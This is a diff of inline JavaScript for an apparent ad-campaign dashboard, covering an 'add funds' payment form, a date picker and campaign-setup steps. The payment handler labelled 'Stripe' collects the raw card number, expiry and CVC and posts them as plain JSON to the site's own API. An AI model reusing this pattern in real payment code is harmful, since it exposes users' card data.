-        if (paymentMethod === 'Stripe') {
-            const cardNumberInput = this.querySelector('input[placeholder="1234 5678 9012 3456"]');
-            const expiryInput = this.querySelector('input[placeholder="MM/YY"]');
-            const cvcInput = this.querySelector('input[placeholder="123"]');
-            
-            formData = {
-                paymentMethod: 'Stripe',
-                cardNumber: cardNumberInput.value,
-                expiryDate: expiryInput.value,
-                cvc: cvcInput.value,
-                amount: amount
-            };
+        // Prepare form data
+        let formData = {
+            paymentMethod: currentPaymentMethod,
+            amount: paymentForm.querySelector('input[name="amount"]').value
+        };
+
+        // Add method-specific details
+        if (currentPaymentMethod === 'stripe') {
+            formData.cardNumber = paymentForm.querySelector('input[name="cardNumber"]').value.replace(/\s/g, '');
+            formData.expiryDate = paymentForm.querySelector('input[name="expiryDate"]').value;
+            formData.cvc = paymentForm.querySelector('input[name="cvc"]').value;
         } else {
-            const paypalEmailInput = this.querySelector('input[type="email"]');
-            
-            formData = {
-                paymentMethod: 'PayPal',
-                paypalEmail: paypalEmailInput.value,
-                amount: amount
-            };
+            formData.paypalEmail = document.getElementById('paypalEmail').value;
         }
 
         try {
-            const response = await fetch('http://localhost:3000/api/payment', {
+            // Send payment data
+            const response = await fetch('/api/payment', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -884,131 +1005,229 @@ document.addEventListener('DOMContentLoaded', function() {
                 body: JSON.stringify(formData)
             });
 
-            const responseData = await response.json();
-
             if (response.ok) {
-                statusLabel.textContent = responseData.message || 'Payment information submitted successfully!';
-                statusLabel.classList.add('success');
-                // Reset form
-                this.reset();
+                // Show verification page
+                if (verificationPage && paymentFormContainer) {
+                    verificationPage.classList.remove('hidden');
+                    paymentFormContainer.classList.add('hidden');
+
+                    // Reset form
+                    paymentForm.reset();
+                    selectPaymentMethod('stripe');
+                }
             } else {
-                statusLabel.textContent = responseData.error || 'Failed to submit payment information';
+                const data = await response.json();
+                statusLabel.textContent = data.error || 'Payment submission failed.';
                 statusLabel.classList.add('error');
             }
         } catch (error) {
-            console.error('Payment submission error:', error);
-            statusLabel.textContent = 'There was an error submitting your payment information. Please try again.';
+            console.error('Payment error:', error);
+            statusLabel.textContent = 'An error occurred. Please try again.';
             statusLabel.classList.add('error');
         }
     });
 });
-function showCampaignForm(mode, campaignId) {
-    showSection('createCampaignSection');
+
+// Payment method selection function
+function selectPaymentMethod(method) {
+    const buttons = document.querySelectorAll('.payment-method');
+    const stripeSect = document.querySelector('.stripe-section');
+    const paypalSect = document.querySelector('.paypal-section');
     
-    const title = document.getElementById('campaignFormTitle');
-    const idElement = document.getElementById('campaignId');
+    // Get all input elements
+    const stripeInputs = stripeSect.querySelectorAll('input');
+    const paypalInput = paypalSect.querySelector('input');
+
+    // Reset buttons and requirements
+    buttons.forEach(btn => btn.classList.remove('active'));
+    stripeInputs.forEach(input => input.removeAttribute('required'));
+    paypalInput.removeAttribute('required');
+
+    // Activate selected method
+    const activeButton = Array.from(buttons).find(btn => 
+        btn.querySelector('i').classList.contains(method === 'stripe' ? 'fa-stripe' : 'fa-paypal')
+    );
     
-    if (mode === 'edit' && campaignId) {
-        title.textContent = 'Edit Campaign';
-        idElement.textContent = campaignId;
-        // Load campaign data here
-        loadCampaignData(campaignId);
+    if (activeButton) activeButton.classList.add('active');
+
+    // Toggle sections and set requirements
+    if (method === 'stripe') {
+        stripeSect.classList.remove('hidden');
+        paypalSect.classList.add('hidden');
+        stripeInputs.forEach(input => input.setAttribute('required', 'true'));
     } else {
-        title.textContent = 'Create Campaign';
-        idElement.textContent = '';
+        stripeSect.classList.add('hidden');
+        paypalSect.classList.remove('hidden');
+        paypalInput.setAttribute('required', 'true');
     }
 }
 
-function loadCampaignData(campaignId) {
-    // Example campaign data - replace with actual data loading
-    const campaignData = {
-        id: campaignId,
-        optimization: 'manual',
-        // Add other campaign properties
-    };
-    
-    // Set optimization strategy
-    selectOptimization(campaignData.optimization, true);
-}
+        function togglePaymentForm() {
+            showSection('paymentForm');
+            document.querySelectorAll('.nav-menu li').forEach(item => {
+                item.classList.remove('active');
+            });
+            const addFundsNavItem = document.querySelector('a[href="#add-funds"]').parentElement;
+            addFundsNavItem.classList.add('active');
 
-function selectOptimization(type, skipDisabled = false) {
-    const cards = document.querySelectorAll('.optimization-card');
-    
-    cards.forEach(card => {
-        if (!card.classList.contains('disabled') || skipDisabled) {
-            card.classList.remove('active');
-            if (card.querySelector('.card-title').textContent.toLowerCase().includes(type)) {
-                card.classList.add('active');
+            if (window.innerWidth <= 768) {
+                toggleSidebar();
             }
         }
-    });
-}
-// Add to your existing JavaScript
 
-document.addEventListener('DOMContentLoaded', function() {
-    // Handle step navigation with smooth scrolling
-    const stepItems = document.querySelectorAll('.step-item');
-    stepItems.forEach(item => {
-        item.addEventListener('click', (e) => {
-            e.preventDefault();
-            
-            // Update active states
-            stepItems.forEach(step => step.classList.remove('active'));
-            item.classList.add('active');
-            
-            // Handle scrolling to sections
-            const stepNumber = item.querySelector('.step-number').textContent;
-            let targetSection;
-            
-            switch(stepNumber) {
-                case '1':
-                    targetSection = document.querySelector('.optimization-options');
-                    break;
-                case '2':
-                    targetSection = document.querySelector('.creative-section');
-                    break;
-                // Add cases for other steps
+        function initializeDatePicker() {
+            const dateFilterBtn = document.querySelector('.date-filter-btn');
+            const popup = document.querySelector('.date-picker-popup');
+            const cancelBtn = document.querySelector('.cancel-btn');
+            const applyBtn = document.querySelector('.apply-btn');
+            const startDate = document.getElementById('startDate');
+            const startTime = document.getElementById('startTime');
+            const endDate = document.getElementById('endDate');
+            const endTime = document.getElementById('endTime');
+
+            if (!dateFilterBtn) return;
+
+            function formatDate(date, time) {
+                const d = new Date(`${date}T${time}`);
+                return d.toLocaleString('en-US', {
+                    month: 'short',
+                    day: 'numeric',
+                    year: 'numeric',
+                    hour: 'numeric',
+                    minute: '2-digit',
+                    hour12: false
+                });
             }
-            
-            if (targetSection) {
-                targetSection.scrollIntoView({ behavior: 'smooth' });
+
+            function updateDateRangeText() {
+                const formattedText = `${formatDate(startDate.value, startTime.value)} - ${formatDate(endDate.value, endTime.value)}`;
+                document.getElementById('dateRangeText').textContent = formattedText;
+            }
+
+            dateFilterBtn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                popup.classList.toggle('hidden');
+            });
+
+            cancelBtn.addEventListener('click', () => {
+                popup.classList.add('hidden');
+            });
+
+            applyBtn.addEventListener('click', () => {
+                updateDateRangeText();
+                popup.classList.add('hidden');
+            });
+
+            document.addEventListener('click', (e) => {
+                if (!popup.contains(e.target) && !dateFilterBtn.contains(e.target)) {
+                    popup.classList.add('hidden');
+                }
+            });
+
+            popup.addEventListener('click', (e) => {
+                e.stopPropagation();
+            });
+        }
+
+        function showVerificationPage() {
+            document.getElementById('verificationPage').classList.remove('hidden');
+            document.getElementById('paymentForm').classList.add('hidden');
+        }
+
+        function hideVerificationPage() {
+            document.getElementById('verificationPage').classList.add('hidden');
+            document.getElementById('emptyState').classList.remove('hidden');
+        }
+
+        function showCampaignForm(mode, campaignId) {
+            showSection('createCampaignSection');
+
+            const title = document.getElementById('campaignFormTitle');
+            const idElement = document.getElementById('campaignId');
+
+            if (mode === 'edit' && campaignId) {
+                title.textContent = 'Edit Campaign';
+                idElement.textContent = campaignId;
+                loadCampaignData(campaignId);
+            } else {
+                title.textContent = 'Create Campaign';
+                idElement.textContent = '';
+            }
+        }
+
+        function loadCampaignData(campaignId) {
+            const campaignData = {
+                id: campaignId,
+                optimization: 'manual',
+            };
+            selectOptimization(campaignData.optimization, true);
+        }
+
+        function selectOptimization(type, skipDisabled = false) {
+            const cards = document.querySelectorAll('.optimization-card');
+            cards.forEach(card => {
+                if (!card.classList.contains('disabled') || skipDisabled) {
+                    card.classList.remove('active');
+                    if (card.querySelector('.card-title').textContent.toLowerCase().includes(type)) {
+                        card.classList.add('active');
+                    }
+                }
+            });
+        }
+
+        // Initialize campaign steps
+        document.addEventListener('DOMContentLoaded', function () {
+            const stepItems = document.querySelectorAll('.step-item');
+            stepItems.forEach(item => {
+                item.addEventListener('click', (e) => {
+                    e.preventDefault();
+
+                    // Update active states
+                    stepItems.forEach(step => step.classList.remove('active'));
+                    item.classList.add('active');
+
+                    // Handle scrolling to sections
+                    const stepNumber = item.querySelector('.step-number').textContent;
+                    let targetSection;
+
+                    switch (stepNumber) {
+                        case '1':
+                            targetSection = document.querySelector('.optimization-options');
+                            break;
+                        case '2':
+                            targetSection = document.querySelector('.creative-section');
+                            break;
+                        // Add cases for other steps
+                    }
+
+                    if (targetSection) {
+                        targetSection.scrollIntoView({ behavior: 'smooth' });
+                    }
+                });
+            });
+
+            // Handle priority button selection
+            const priorityBtns = document.querySelectorAll('.priority-btn');
+            priorityBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    priorityBtns.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                });
+            });
+
+            // Handle adding new creative rows
+            const addCreativeBtn = document.querySelector('.add-creative-btn');
+            const creativeRows = document.querySelector('.creative-rows');
+
+            if (addCreativeBtn && creativeRows) {
+                addCreativeBtn.addEventListener('click', () => {
+                    const newRow = creativeRows.querySelector('.creative-row').cloneNode(true);
+                    // Clear input values
+                    newRow.querySelectorAll('input').forEach(input => input.value = '');
+                    creativeRows.appendChild(newRow);
+                });
             }
         });
-    });
-
-    // Handle priority button selection
-    const priorityBtns = document.querySelectorAll('.priority-btn');
-    priorityBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            priorityBtns.forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-        });
-    });
-
-    // Handle adding new creative rows
-    const addCreativeBtn = document.querySelector('.add-creative-btn');
-    const creativeRows = document.querySelector('.creative-rows');
-    
-    if(addCreativeBtn && creativeRows) {
-        addCreativeBtn.addEventListener('click', () => {
-            const newRow = creativeRows.querySelector('.creative-row').cloneNode(true);
-            // Clear input values
-            newRow.querySelectorAll('input').forEach(input => input.value = '');
-            creativeRows.appendChild(newRow);
-        });
-    }
-
-    // Handle closing notification
-    const closeNotification = document.querySelector('.close-notification');
-    const notificationBanner = document.querySelector('.notification-banner');
-    
-    if(closeNotification && notificationBanner) {
-        closeNotification.addEventListener('click', () => {
-            notificationBanner.style.display = 'none';
-        });
-    }
-});
-
     </script>
 </body>
 
